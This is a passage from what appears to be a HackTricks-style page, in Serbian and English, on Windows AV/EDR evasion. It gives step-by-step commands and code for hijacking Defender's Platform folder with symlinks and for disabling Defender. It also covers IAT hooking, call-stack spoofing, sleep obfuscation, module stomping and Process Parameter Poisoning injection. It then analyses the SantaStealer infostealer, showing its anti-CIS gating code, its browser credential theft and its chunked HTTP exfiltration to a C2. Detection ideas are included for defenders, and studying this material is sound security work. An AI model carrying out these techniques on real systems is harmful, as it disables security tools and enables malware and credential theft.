robocopy %SRC% %DST% /MIR
```
2) Kreirajte symlink direktorijuma sa višom verzijom unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da posmatrate novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registry koja odražava tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/izvršavanje koda: Postavite/zamenite DLL-ove koje Defender učitava iz svog direktorijuma aplikacije kako biste izvršili kod u Defender procesima. Pogledajte odeljak iznad: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Prekid/uskraćivanje servisa: Uklonite version-symlink tako da se pri sledećem pokretanju konfigurisana putanja ne razreši i Defender ne uspe da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; zahteva administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red timovi mogu premestiti runtime evasion iz C2 implant-a direktno u ciljni modul tako što će hook-ovati njegovu Import Address Table (IAT) i usmeriti odabrane API-je kroz napadačev position-independent code (PIC). Ovo proširuje evasion izvan malog API opsega koji mnogi kit-ovi izlažu (npr. CreateProcessA) i pruža istu zaštitu BOF-ovima i post-exploitation DLL-ovima.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Stage-ujte PIC blob pored ciljnog modula koristeći reflective loader (prepending ili companion). PIC mora biti samostalan i position-independent.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i patch-ujte IAT entries za ciljane import-e (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrappers.
- Svaki PIC wrapper izvršava evasion pre tail-calling-a stvarne API adrese. Tipičan evasion obuhvata:
- Memory mask/unmask oko poziva (npr. encrypt beacon region-a, RWX→RX, promena page name-ova/permission-a), a zatim restore nakon poziva.
- Call-stack spoofing: konstruišite benigni stack i pređite u ciljni API tako da call-stack analiza razreši očekivane frame-ove.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, eksportujte interfejs kako bi Aggressor script (ili ekvivalent) mogao da registruje API-je koje treba hook-ovati za Beacon, BOF-ove i post-ex DLL-ove.

Zašto ovde koristiti IAT hooking
- Funkcioniše za svaki code koji koristi hook-ovani import, bez menjanja tool code-a ili oslanjanja na Beacon da proxy-je specifične API-je.
- Obuhvata post-ex DLL-ove: hook-ovanje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog masking/stack evasion-a na njihove API pozive.
- Vraća pouzdanu upotrebu post-ex komandi za pokretanje procesa protiv detekcija zasnovanih na call stack-u, wrapping-om CreateProcessA/W.

Minimalni IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Beleške
- Primeni patch nakon relocations/ASLR-a, a pre prve upotrebe importa. Reflective loaders kao što su TitanLdr/AceLdr demonstriraju hooking tokom DllMain-a učitanog modula.
- Wrappers neka budu mali i PIC-safe; pravi API razreši preko originalne IAT vrednosti koju si sačuvao pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje writable+executable stranica.

Call‑stack spoofing stub
- PIC stubovi u Draugr stilu grade lažni call chain (return addresses unutar benignih modula), a zatim prelaze u pravi API.
- Ovo zaobilazi detections koje očekuju canonical stacks od Beacon/BOFs do sensitive APIs.
- Kombinuj sa stack cutting/stack stitching tehnikama kako bi se izvršavanje smestilo unutar očekivanih frames pre API prologue-a.

Operational integration
- Dodaj reflective loader na početak post-ex DLL-ova kako bi se PIC i hooks automatski inicijalizovali kada se DLL učita.
- Koristi Aggressor script za registraciju target APIs, tako da Beacon i BOFs transparentno koriste isti evasion path bez izmena koda.

Detection/DFIR considerations
- IAT integrity: entries koje se razrešavaju u non-image (heap/anon) addresses; periodična verifikacija import pointers.
- Stack anomalies: return addresses koje ne pripadaju loaded images; nagli prelazi na non-image PIC; nedosledna RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes u IAT, rana DllMain aktivnost koja menja import thunks, neočekivani RX regions kreirani pri učitavanju.
- Image-load evasion: ako se hookuje LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr assemblies povezana sa memory masking events.

Related building blocks and examples
- Reflective loaders koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Ako kontrolišeš reflective loader, možeš hookovati imports **tokom** `ProcessImports()` tako što zameniš loaderov `GetProcAddress` pointer custom resolverom koji prvo proverava hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **resident PICO** (persistent PIC object) koji opstaje nakon što se transient loader PIC oslobodi.
- Exportuj `setup_hooks()` funkciju koja prepisuje loaderov import resolver (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress` preskoči ordinal imports i koristi hash-based hook lookup kao što je `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom prosledi poziv pravom `GetProcAddress`.
- Registruj hook targets u link time-u pomoću Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook ostaje validan zato što se nalazi unutar resident PICO-a.

Ovim se dobija **import-time IAT redirection** bez patchovanja code section-a učitanog DLL-a nakon učitavanja.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks se aktiviraju samo ako je funkcija zaista u targetovom IAT-u. Ako modul razrešava APIs preko PEB-walk + hash-a (bez import entry-ja), nametni pravi import kako bi loaderov `ProcessImports()` path mogao da ga obradi:

- Zameni hashed export resolution (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom kao što je `&WaitForSingleObject`.
- Compiler emituje IAT entry, čime se omogućava interception kada reflective loader razrešava imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Umesto patchovanja `Sleep`, hookuj **stvarne wait/IPC primitives** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kod dugih čekanja, obuhvati poziv Ekko-style obfuscation chain-om koji enkriptuje image u memoriji tokom idle perioda:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` za zakazivanje niza callbacks koji pozivaju `NtContinue` sa kreiranim `CONTEXT` frames.
- Tipičan chain (x64): postavi image na `PAGE_READWRITE` → RC4 encrypt preko `advapi32!SystemFunction032` nad celim mapped image-om → izvrši blocking wait → RC4 decrypt → **obnovi per-section permissions** prolaskom kroz PE sections → signalizuj završetak.
- `RtlCaptureContext` obezbeđuje template `CONTEXT`; kloniraj ga u više frames i postavi registers (`Rip/Rcx/Rdx/R8/R9`) za pozivanje svakog koraka.

Operational detail: vrati “success” za duga čekanja (npr. `WAIT_OBJECT_0`) kako bi caller nastavio izvršavanje dok je image maskiran. Ovaj pattern skriva modul od scanners tokom idle windows i izbegava klasični “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts `CreateTimerQueueTimer` callbacks koji pokazuju na `NtContinue`.
- `advapi32!SystemFunction032` korišćen nad velikim contiguous image-sized buffers.
- `VirtualProtect` nad velikim range-om, praćen custom per-section permission restoration-om.

### Runtime CFG registration for sleep-obfuscation gadgets

Na CFG-enabled targets, prvi indirect jump u mid-function gadget kao što je `jmp [rbx]` ili `jmp rdi` obično će srušiti proces sa `STATUS_STACK_BUFFER_OVERRUN`, zato što gadget nije prisutan u CFG metadata-i modula. Da bi Ekko/Kraken-style chains opstali unutar hardened processes:<sup>[[30]](#references)</sup>

- Registruj svaki indirect destination koji chain koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i `CFG_CALL_TARGET_VALID` entries.
- Za addresses unutar loaded images (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora početi na **image base-u** i obuhvatiti **punu veličinu image-a**.
- Za manually mapped/PIC/stomped regions koristi **allocation base** i allocation size.
- Obeleži ne samo dispatch gadget, već i exports do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), kao i sve attacker-controlled executable sections koje će postati indirect targets.

Ovo pretvara ROP/JOP-style sleep chains iz primitive koja “radi samo u non-CFG processes” u reusable primitive za `explorer.exe`, browsers, `svchost.exe` i druge endpoints kompajlirane sa `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Potpuna `CONTEXT` replacement je upadljiva i može otkazati na CET Shadow Stack systems, zato što spoofed `Rip` i dalje mora odgovarati hardware shadow stack-u. Bezbedniji sleep-masking pattern je:<sup>[[30]](#references)</sup>

- Izaberi drugu thread-u u istom procesu i pročitaj njene `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) preko `NtQueryInformationThread`.
- Napravi backup stvarnog TEB/TIB-a trenutne thread-e.
- Capture-uj stvarni sleeping context pomoću `GetThreadContext`.
- Kopiraj **samo stvarni `Rip`** u spoof context, ostavljajući spoofed `Rsp`/stack state netaknutim.
- Tokom sleep window-a, kopiraj spoof thread-in `NT_TIB` u current TEB kako bi stack walkers radili unwind unutar legitimate stack range-a.
- Nakon završetka wait-a, restore-uj originalni TIB i thread context.

Ovo čuva CET-consistent instruction pointer, dok obmanjuje EDR stack walkers koji se oslanjaju na TEB stack metadata za validaciju unwind-ova.

### APC-based alternative: Kraken Mask

Ako je timer-queue dispatch previše signatured, ista sleep-encrypt-spoof-restore sekvenca može se izvršiti iz suspended helper thread-e koristeći queued APCs:<sup>[[27]](#references)</sup>

- Kreiraj helper thread sa `NtTestAlert` kao entrypoint-om.
- Queue-uj pripremljene `CONTEXT` frames/APCs sa `NtQueueApcThread` i isprazni ih pomoću `NtAlertResumeThread`.
- Čuvaj chain state na heap-u umesto na helper stack-u kako bi se izbeglo iscrpljivanje podrazumevanog 64 KB thread stack-a.
- Koristi `NtSignalAndWaitForSingleObject` za atomsko signalizovanje start event-a i blokiranje.
- Suspenduj main thread pre restore-ovanja TIB/context-a (`NtSuspendThread` → restore → `NtResumeThread`) kako bi se smanjio race window u kojem bi scanner mogao uhvatiti polu-obnovljeni stack.

Ovim se `CreateTimerQueueTimer` + `NtContinue` signature zamenjuje helper-thread/APC signature-om, uz zadržavanje istih RC4 masking i stack-spoofing ciljeva.

Additional detection ideas
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre sleeps, waits ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` obavijen oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread` praćen direktnim upisima u TEB/TIB stack bounds trenutne thread-e.
- `NtQueueApcThread`/`NtAlertResumeThread` chains koji indirektno dolaze do `SystemFunction032`, `VirtualProtect` ili helpers za section-permission restoration.
- Ponovljena upotreba short gadget signatures kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivots unutar signed modules.


## Precision Module Stomping

Module stomping izvršava payload iz **`.text` section-a DLL-a koji je već mapiran unutar target process-a** umesto alociranja očigledne private executable memory ili učitavanja novog sacrificial DLL-a. Target za overwrite treba da bude **loaded, disk-backed image** čiji code space može da primi payload bez korumpiranja code paths koje procesu i dalje trebaju.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Naive stomping protiv common modules kao što su `uxtheme.dll` ili `comctl32.dll` je fragilan: DLL možda nije učitan u remote process-u, a premali code region će srušiti proces. Pouzdaniji workflow je:

1. Enumeriši target process modules i zadrži **names-only include list** DLL-ova koji su već učitani.
2. Prvo build-uj payload i zabeleži njegovu **tačnu byte size**.
3. Skeniraj candidate DLL-ove na disku i uporedi PE section **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od file size-a zato što odražava veličinu executable section-a **kada se mapira u memory**.
4. Parsiraj **Export Address Table (EAT)** i izaberi exported function RVA kao stomp start offset.
5. Izračunaj **blast radius**: ako payload premašuje boundary izabrane funkcije, overwrite-ovaće susedne exports raspoređene nakon nje u memoriji.

Typical recon/selection helpers viđeni u praksi:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operativne napomene
- Dajte prednost DLL-ovima koji su **već učitani** u udaljeni proces kako biste izbegli telemetriju funkcije `LoadLibrary`/neočekivanih učitavanja image-a.
- Dajte prednost export-ima koje ciljna aplikacija retko izvršava; u suprotnom, normalni tokovi koda mogu naići na izmenjene bajtove pre ili nakon kreiranja threada.
- Veliki implant-i često zahtevaju promenu načina ugrađivanja shellcode-a sa string literala na **byte-array/braced initializer**, kako bi ceo bafer bio ispravno predstavljen u izvornom kodu injectora.

Ideje za detekciju
- Udaljeni upisi u **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto češćih privatnih RWX/RX alokacija.
- Export entry points čiji se bajtovi u memoriji više ne podudaraju sa odgovarajućim fajlom na disku.
- Udaljeni thread-ovi ili promene konteksta koji započinju izvršavanje unutar legitimnog DLL export-a čiji su prvi bajtovi nedavno izmenjeni.
- Sumnjive sekvence `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje threada.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **process-injection / EDR-evasion** koja izbegava klasični remote write put (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenuti ciljni proces, ona zloupotrebljava činjenicu da Windows **kopira odabrane `CreateProcessW` startup parametre u child proces** i čuva ih unutar `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers koje kopira `CreateProcessW`

Korisni carriers su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (sa `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja carriers:

- `lpCommandLine` mora pokazivati na **writable memory** za `CreateProcessW`, a ograničen je na **32,767 Unicode karaktera**, uključujući null terminator.
- `lpEnvironment` mora biti Unicode environment block uzastopnih `NAME=VALUE\0` stringova, završen dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba tretirati kao implementation detail, a ne kao stabilan dokumentovani ugovor.

Ovo pretvara normalno kreiranje procesa u **payload-transfer primitive**. Operator kreira child proces sa attacker-controlled startup podacima i prepušta Windows-u da obavi cross-process kopiranje.

### Remote lookup flow bez remote write API-ja

Nakon kreiranja child procesa, pronađite kopirani bafer pomoću **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobavite `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitajte udaljeni `PEB`
3. Pratite `PEB.ProcessParameters`
4. Pročitajte `RTL_USER_PROCESS_PARAMETERS`
5. Koristite izabrani pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimalni tok:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršiv. Uobičajeni P3 chain je:

1. Kreirati proces normalno (ne suspendovan)
2. Učiniti izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebiti handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmeriti izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepisivanje `RIP`)

Za razliku od klasičnih thread hijacking workflow-a, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst se može direktno promeniti na handle-u vraćene glavne niti.

Ovim se izbegava nekoliko API-ja koji se često nadgledaju zbog injection-a:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često takođe `SuspendThread` / `ResumeThread`

### Ograničenje null-byte-ova i staged shellcode

Sva tri carrier-a su **string ili string-like podaci**, tako da se raw payload koji sadrži `0x00` skraćuje tokom transfera. Praktično rešenje je **null-free first stage** koji rekonstruiše konstante tokom izvršavanja, a zatim učitava proizvoljni second stage.

Jednostavan obrazac je XOR-based constant synthesis:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Ovo omogućava da first stage izgradi stringove za stack, API argumente, putanje do DLL-ova ili shellcode loader za second stage bez ugrađivanja null bajtova u transportovani parametar.

### Stack-based API pozivi iz first stage-a

Kada first stage mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/buffer na stack cilja
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- zadrži `RSP` **poravnat na 16 bajtova** pre poziva

Second stage se zatim može kopirati sa stack-a u `PAGE_READWRITE` alokaciju, promeniti u `PAGE_EXECUTE_READ` pomoću `VirtualProtect` i izvršiti skokom, čime se izbegava direktna RWX alokacija.

### Detection ideje

Dobre mogućnosti za hunting koje autori navode:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji stranice process parametara čine izvršivim
- ta promena zaštite praćena pozivom `SetThreadContext` / `NtSetContextThread`
- remote čitanja `PEB`-a, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugački / entropijski visoki `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` parametri tokom kreiranja procesa

### Napomene

- P3 je **trik za transfer između procesa**, a ne potpuna execution primitive sam po sebi: kopirani parametar i dalje zahteva promenu na execute dozvole i metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili zato što interno dolazi do sumnjivih primitives kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## SantaStealer Tradecraft za Fileless Evasion i krađu kredencijala

SantaStealer (poznat i kao BluelineStealer) pokazuje kako moderni info-stealers objedinjuju AV bypass, anti-analysis i pristup kredencijalima u jednom workflow-u.<sup>[[24]](#references)</sup>

### Gating prema rasporedu tastature i odlaganje sandbox-a

- Config flag (`anti_cis`) enumeriše instalirane rasporede tastature pomoću `GetKeyboardLayoutList`. Ako se pronađe ćirilični raspored, sample kreira prazan `CIS` marker i prekida rad pre pokretanja stealers-a, čime obezbeđuje da se nikada ne detonira na isključenim lokalima, dok istovremeno ostavlja hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svaki naziv pomoću prilagođenog rolling checksum-a i poredi ga sa ugrađenim blocklistama za debuggere/sandbox okruženja; ponavlja checksum nad nazivom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (donju granicu broja procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` radi otkrivanja VirtualBox dodataka i obavlja provere vremena oko sleep poziva kako bi uočila single-stepping. Svako podudaranje prekida izvršavanje pre pokretanja modula.

### Fileless helper + double ChaCha20 reflective loading

- Primarni DLL/EXE sadrži Chromium credential helper koji se ili zapisuje na disk ili ručno mapira u memoriju; fileless režim sam razrešava import-e/relokacije, pa se nikakvi helper artefakti ne upisuju.
- Taj helper čuva DLL druge faze dvostruko šifrovan pomoću ChaCha20 (dva ključa od 32 bajta + nonce-ovi od 12 bajtova). Nakon oba prolaza, reflectively učitava blob (bez `LoadLibrary`) i poziva export-e `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- ChromElevator rutine koriste direct-syscall reflective process hollowing za ubacivanje u aktivni Chromium browser, nasleđuju AppBound Encryption ključeve i dešifruju passwords/cookies/credit cards direktno iz SQLite baza, uprkos ABE hardening-u.


### Modularno prikupljanje u memoriji i chunked HTTP exfil

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće po jednu nit za svaki omogućen modul (Telegram, Discord, Steam, screenshots, documents, browser extensions itd.). Svaka nit upisuje rezultate u deljene buffere i prijavljuje broj svojih fajlova nakon prozora za pridruživanje od približno 45 sekundi.
- Po završetku, sve se zip-uje pomoću statički linkovane `miniz` biblioteke kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim spava 15 sekundi i šalje arhivu u chunk-ovima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, imitirajući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opcioni `w: <campaign_tag>`, dok poslednji chunk dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [16] [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)

{{#include ../banners/hacktricks-training.md}}
